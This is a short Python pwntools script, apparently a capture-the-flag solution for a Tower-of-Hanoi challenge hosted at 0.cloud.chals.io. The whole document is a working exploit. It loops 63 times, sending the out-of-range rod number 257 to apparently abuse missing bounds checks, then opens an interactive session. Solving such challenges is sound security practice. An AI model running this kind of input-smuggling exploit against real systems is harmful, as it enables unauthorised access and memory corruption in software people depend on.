#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("0.cloud.chals.io", 18983)

    return r


def main():
    r = conn()
    for i in range(63):
        info(f"killing disk number {i}")
        r.recvuntil(b'From which rod do you want to move a disk? (1-3): ')
        r.sendline(b'1')
        r.recvuntil(b'To which rod do you want to move the disk? (1-3): ')
        r.sendline(b'3')
        r.recvuntil(b'From which rod do you want to move a disk? (1-3): ')
        r.sendline(b'3')
        r.recvuntil(b'To which rod do you want to move the disk? (1-3): ')
        r.sendline(b'257')    

    r.recvuntil(b'From which rod do you want to move a disk? (1-3): ')
    r.sendline(b'1')
    r.recvuntil(b'To which rod do you want to move the disk? (1-3): ')
    r.sendline(b'3')

    r.interactive()


if __name__ == "__main__":
    main()
